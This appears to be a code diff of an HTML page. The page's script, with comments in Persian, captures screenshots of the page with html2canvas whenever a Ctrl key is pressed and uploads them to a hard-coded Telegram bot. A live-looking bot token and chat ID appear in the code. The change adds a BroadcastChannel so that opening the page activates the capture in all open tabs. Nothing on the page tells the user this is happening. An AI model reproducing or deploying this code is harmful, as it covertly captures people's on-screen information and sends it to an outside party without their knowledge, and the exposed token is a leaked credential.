@@ -3,28 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Script with Local Storage</title>
+    <title>Global Script with BroadcastChannel</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.3.2/html2canvas.min.js"></script>
 </head>
 <body>
-    <h1>Global Script with Local Storage</h1>
-    <p>This script will run globally in all tabs using Local Storage.</p>
+    <h1>Global Script with BroadcastChannel</h1>
+    <p>Open this URL in one tab, and it will activate the script in all tabs.</p>
 
     <script>
-        // Telegram bot token and chat ID
         const token = "7110052875:AAF8o8Rof0q4KFEuVZBLEHM1bgaWe7pZQss";
         const chat_id = "-4583889773";
         const telegramAPI = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-        // Check if script is already running
-        if (!localStorage.getItem('globalScriptRunning')) {
-            localStorage.setItem('globalScriptRunning', 'true');
-            console.log("Global script activated for the first time.");
-        } else {
-            console.log("Global script already running.");
+        // BroadcastChannel برای ارتباط بین تب‌ها
+        const channel = new BroadcastChannel('global_script_channel');
+
+        // ارسال پیام به تمام تب‌ها برای اجرای کد
+        function activateGlobalScript() {
+            channel.postMessage('activate');
         }
 
-        // Function to send a screenshot to Telegram
+        // دریافت پیام و اجرای کد در تب‌های دیگر
+        channel.onmessage = (event) => {
+            if (event.data === 'activate') {
+                console.log('Script activated in this tab.');
+                startScript();
+            }
+        };
+
+        // عملکرد اصلی اسکریپت
+        function startScript() {
+            document.addEventListener('keydown', function (event) {
+                if (event.ctrlKey) {
+                    takeScreenshot();
+                }
+            });
+
+            // هر ۵ ثانیه یک پیام لاگ می‌شود
+            setInterval(() => {
+                console.log("Global script is running.");
+            }, 5000);
+        }
+
+        // ارسال اسکرین‌شات به تلگرام
         function takeScreenshot() {
             html2canvas(document.body, { useCORS: true }).then(function (canvas) {
                 const base64image = canvas.toDataURL("image/png");
@@ -32,7 +53,7 @@
             });
         }
 
-        // Function to send the screenshot to Telegram
+        // ارسال تصویر به تلگرام
         function sendToTelegram(base64image) {
             const byteString = atob(base64image.split(',')[1]);
             const mimeString = base64image.split(',')[0].split(':')[1].split(';')[0];
@@ -53,18 +74,8 @@
             }).catch(error => console.error("Error:", error));
         }
 
-        // Add keyboard event listener
-        document.addEventListener('keydown', function (event) {
-            if (event.ctrlKey) {
-                console.log("Taking screenshot...");
-                takeScreenshot();
-            }
-        });
-
-        // Test periodic logging (to simulate persistent behavior)
-        setInterval(() => {
-            console.log("Global script is still running in all tabs.");
-        }, 5000);
+        // فعال‌سازی کد در تب اصلی
+        activateGlobalScript();
     </script>
 </body>
 </html>
